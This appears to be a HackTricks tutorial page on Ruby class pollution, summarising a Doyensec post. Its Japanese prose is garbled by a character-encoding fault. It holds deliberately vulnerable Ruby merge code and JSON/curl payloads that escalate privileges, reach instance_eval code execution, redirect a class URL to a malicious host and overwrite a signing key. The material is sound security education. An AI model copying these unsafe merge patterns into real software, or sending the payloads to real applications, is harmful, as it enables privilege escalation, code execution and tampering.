# Ruby Class Pollution

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

ã“ã‚Œã¯æŠ•ç¨¿ã®è¦ç´„ã§ã™ [https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)

## å±æ€§ã®ãƒãƒ¼ã‚¸

ä¾‹:
```ruby
# Code from https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html
# Comments added to exploit the merge on attributes
require 'json'


# Base class for both Admin and Regular users
class Person

attr_accessor :name, :age, :details

def initialize(name:, age:, details:)
@name = name
@age = age
@details = details
end

# Method to merge additional data into the object
def merge_with(additional)
recursive_merge(self, additional)
end

# Authorize based on the `to_s` method result
def authorize
if to_s == "Admin"
puts "Access granted: #{@name} is an admin."
else
puts "Access denied: #{@name} is not an admin."
end
end

# Health check that executes all protected methods using `instance_eval`
def health_check
protected_methods().each do |method|
instance_eval(method.to_s)
end
end

private

# VULNERABLE FUNCTION that can be abused to merge attributes
def recursive_merge(original, additional, current_obj = original)
additional.each do |key, value|

if value.is_a?(Hash)
if current_obj.respond_to?(key)
next_obj = current_obj.public_send(key)
recursive_merge(original, value, next_obj)
else
new_object = Object.new
current_obj.instance_variable_set("@#{key}", new_object)
current_obj.singleton_class.attr_accessor key
end
else
current_obj.instance_variable_set("@#{key}", value)
current_obj.singleton_class.attr_accessor key
end
end
original
end

protected

def check_cpu
puts "CPU check passed."
end

def check_memory
puts "Memory check passed."
end
end

# Admin class inherits from Person
class Admin < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end

def to_s
"Admin"
end
end

# Regular user class inherits from Person
class User < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end

def to_s
"User"
end
end

class JSONMergerApp
def self.run(json_input)
additional_object = JSON.parse(json_input)

# Instantiate a regular user
user = User.new(
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
)


# Perform a recursive merge, which could override methods
user.merge_with(additional_object)

# Authorize the user (privilege escalation vulnerability)
# ruby class_pollution.rb '{"to_s":"Admin","name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.authorize

# Execute health check (RCE vulnerability)
# ruby class_pollution.rb '{"protected_methods":["puts 1"],"name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.health_check

end
end

if ARGV.length != 1
puts "Usage: ruby class_pollution.rb 'JSON_STRING'"
exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```
### èª¬æ˜

1. **ç‰¹æ¨©æ˜‡æ ¼**: `authorize` ãƒ¡ã‚½ãƒƒãƒ‰ã¯ `to_s` ãŒ "Admin" ã‚’è¿”ã™ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚JSONã‚’é€šã˜ã¦æ–°ã—ã„ `to_s` å±æ€§ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ `to_s` ãƒ¡ã‚½ãƒƒãƒ‰ãŒ "Admin" ã‚’è¿”ã™ã‚ˆã†ã«ã—ã€ä¸æ­£ãªç‰¹æ¨©ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
2. **ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ**: `health_check` ã§ã¯ã€`instance_eval` ãŒ `protected_methods` ã«ãƒªã‚¹ãƒˆã•ã‚ŒãŸãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚æ”»æ’ƒè€…ãŒã‚«ã‚¹ã‚¿ãƒ ãƒ¡ã‚½ãƒƒãƒ‰åï¼ˆä¾‹ãˆã° `"puts 1"`ï¼‰ã‚’æ³¨å…¥ã™ã‚‹ã¨ã€`instance_eval` ã¯ãã‚Œã‚’å®Ÿè¡Œã—ã€**ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ (RCE)** ã«ã¤ãªãŒã‚Šã¾ã™ã€‚
1. ã“ã‚Œã¯ã€**è„†å¼±ãª `eval` å‘½ä»¤** ãŒãã®å±æ€§ã®æ–‡å­—åˆ—å€¤ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ãŸã‚ã«ã®ã¿å¯èƒ½ã§ã™ã€‚
3. **å½±éŸ¿ã®åˆ¶é™**: ã“ã®è„†å¼±æ€§ã¯å€‹ã€…ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã®ã¿å½±éŸ¿ã‚’ä¸ãˆã€ä»–ã® `User` ãŠã‚ˆã³ `Admin` ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã¯å½±éŸ¿ã‚’ä¸ãˆãªã„ãŸã‚ã€æ‚ªç”¨ã®ç¯„å›²ãŒåˆ¶é™ã•ã‚Œã¾ã™ã€‚

### å®Ÿä¸–ç•Œã®ã‚±ãƒ¼ã‚¹ <a href="#real-world-cases" id="real-world-cases"></a>

### ActiveSupportã® `deep_merge`

ã“ã‚Œã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯è„†å¼±ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã§è„†å¼±ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:&#x20;
```ruby
# Method to merge additional data into the object using ActiveSupport deep_merge
def merge_with(other_object)
merged_hash = to_h.deep_merge(other_object)

merged_hash.each do |key, value|
self.class.attr_accessor key
instance_variable_set("@#{key}", value)
end

self
end
```
### Hashieã®`deep_merge`

Hashieã®`deep_merge`ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒƒã‚·ãƒ¥ã§ã¯ãªãã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå±æ€§ã«ç›´æ¥ä½œç”¨ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ã„ãã¤ã‹ã®**ä¾‹å¤–**ã‚’é™¤ã„ã¦ã€ãƒãƒ¼ã‚¸æ™‚ã«å±æ€§ã§ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ç½®ãæ›ãˆã‚‹ã“ã¨ã‚’**é˜²ãã¾ã™**ï¼š`_`ã€`!`ã€ã¾ãŸã¯`?`ã§çµ‚ã‚ã‚‹å±æ€§ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ãƒãƒ¼ã‚¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ç‰¹åˆ¥ãªã‚±ãƒ¼ã‚¹ã¨ã—ã¦ã€å˜ç‹¬ã®å±æ€§**`_`**ãŒã‚ã‚Šã¾ã™ã€‚å˜ã«`_`ã¯é€šå¸¸`Mash`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’è¿”ã™å±æ€§ã§ã™ã€‚ãã—ã¦ã€ã“ã‚Œã¯**ä¾‹å¤–**ã®ä¸€éƒ¨ã§ã‚ã‚‹ãŸã‚ã€å¤‰æ›´ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

æ¬¡ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚`{"_": "Admin"}`ã‚’æ¸¡ã™ã“ã¨ã§ã€`_.to_s == "Admin"`ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ï¼š
```ruby
require 'json'
require 'hashie'

# Base class for both Admin and Regular users
class Person < Hashie::Mash

# Method to merge additional data into the object using hashie
def merge_with(other_object)
deep_merge!(other_object)
self
end

# Authorize based on to_s
def authorize
if _.to_s == "Admin"
puts "Access granted: #{@name} is an admin."
else
puts "Access denied: #{@name} is not an admin."
end
end

end

# Admin class inherits from Person
class Admin < Person
def to_s
"Admin"
end
end

# Regular user class inherits from Person
class User < Person
def to_s
"User"
end
end

class JSONMergerApp
def self.run(json_input)
additional_object = JSON.parse(json_input)

# Instantiate a regular user
user = User.new({
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
})

# Perform a deep merge, which could override methods
user.merge_with(additional_object)

# Authorize the user (privilege escalation vulnerability)
# Exploit: If we pass {"_": "Admin"} in the JSON, the user will be treated as an admin.
# Example usage: ruby hashie.rb '{"_": "Admin", "name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.authorize
end
end

if ARGV.length != 1
puts "Usage: ruby hashie.rb 'JSON_STRING'"
exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```
## ã‚¯ãƒ©ã‚¹ã‚’æ±šæŸ“ã™ã‚‹ <a href="#escaping-the-object-to-poison-the-class" id="escaping-the-object-to-poison-the-class"></a>

æ¬¡ã®ä¾‹ã§ã¯ã€**`Person`** ã‚¯ãƒ©ã‚¹ã¨ã€**`Person`** ã‚¯ãƒ©ã‚¹ã‹ã‚‰ç¶™æ‰¿ã•ã‚ŒãŸ **`Admin`** ãŠã‚ˆã³ **`Regular`** ã‚¯ãƒ©ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€**`KeySigner`** ã¨ã„ã†åˆ¥ã®ã‚¯ãƒ©ã‚¹ã‚‚ã‚ã‚Šã¾ã™:
```ruby
require 'json'
require 'sinatra/base'
require 'net/http'

# Base class for both Admin and Regular users
class Person
@@url = "http://default-url.com"

attr_accessor :name, :age, :details

def initialize(name:, age:, details:)
@name = name
@age = age
@details = details
end

def self.url
@@url
end

# Method to merge additional data into the object
def merge_with(additional)
recursive_merge(self, additional)
end

private

# Recursive merge to modify instance variables
def recursive_merge(original, additional, current_obj = original)
additional.each do |key, value|
if value.is_a?(Hash)
if current_obj.respond_to?(key)
next_obj = current_obj.public_send(key)
recursive_merge(original, value, next_obj)
else
new_object = Object.new
current_obj.instance_variable_set("@#{key}", new_object)
current_obj.singleton_class.attr_accessor key
end
else
current_obj.instance_variable_set("@#{key}", value)
current_obj.singleton_class.attr_accessor key
end
end
original
end
end

class User < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end
end

# A class created to simulate signing with a key, to be infected with the third gadget
class KeySigner
@@signing_key = "default-signing-key"

def self.signing_key
@@signing_key
end

def sign(signing_key, data)
"#{data}-signed-with-#{signing_key}"
end
end

class JSONMergerApp < Sinatra::Base
# POST /merge - Infects class variables using JSON input
post '/merge' do
content_type :json
json_input = JSON.parse(request.body.read)

user = User.new(
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
)

user.merge_with(json_input)

{ status: 'merged' }.to_json
end

# GET /launch-curl-command - Activates the first gadget
get '/launch-curl-command' do
content_type :json

# This gadget makes an HTTP request to the URL stored in the User class
if Person.respond_to?(:url)
url = Person.url
response = Net::HTTP.get_response(URI(url))
{ status: 'HTTP request made', url: url, response_body: response.body }.to_json
else
{ status: 'Failed to access URL variable' }.to_json
end
end

# Curl command to infect User class URL:
# curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://example.com"}}}' http://localhost:4567/merge

# GET /sign_with_subclass_key - Signs data using the signing key stored in KeySigner
get '/sign_with_subclass_key' do
content_type :json

# This gadget signs data using the signing key stored in KeySigner class
signer = KeySigner.new
signed_data = signer.sign(KeySigner.signing_key, "data-to-sign")

{ status: 'Data signed', signing_key: KeySigner.signing_key, signed_data: signed_data }.to_json
end

# Curl command to infect KeySigner signing key (run in a loop until successful):
# for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge; done

# GET /check-infected-vars - Check if all variables have been infected
get '/check-infected-vars' do
content_type :json

{
user_url: Person.url,
signing_key: KeySigner.signing_key
}.to_json
end

run! if app_file == $0
end
```
### ãƒã‚¤ã‚ºãƒ³è¦ªã‚¯ãƒ©ã‚¹

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦: 

{% code overflow="wrap" %}
```bash
curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://malicious.com"}}}' http://localhost:4567/merge
```
{% endcode %}

è¦ªã‚¯ãƒ©ã‚¹ **`Person`** ã® **`@@url`** å±æ€§ã®å€¤ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

### **ä»–ã®ã‚¯ãƒ©ã‚¹ã®æ±šæŸ“**

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ï¼š 

{% code overflow="wrap" %}
```bash
for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge --silent > /dev/null; done
```
{% endcode %}

å®šç¾©ã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã€ã‚ã‚‹æ™‚ç‚¹ã§ã‚¯ãƒ©ã‚¹ **`KeySigner`** ã‚’æ±šæŸ“ã—ã€`signing_key` ã®å€¤ã‚’ `injected-signing-key` ã«å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\

## å‚è€ƒæ–‡çŒ®

* [https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
